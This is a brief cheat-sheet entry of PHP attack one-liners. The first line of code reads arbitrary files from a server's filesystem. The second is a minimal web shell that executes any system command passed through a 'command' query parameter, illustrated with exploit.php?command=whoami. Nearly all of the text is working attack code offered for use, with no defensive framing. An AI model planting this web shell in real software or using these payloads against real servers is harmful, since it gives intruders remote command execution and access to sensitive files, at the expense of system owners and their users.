## PHP One-liners

Read arbitrary files from the server's filesystem:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

Pass an arbitrary system command via a query parameter _(exploit.php?command=whoami)_:

`<?php echo system($_GET['command']); ?>`



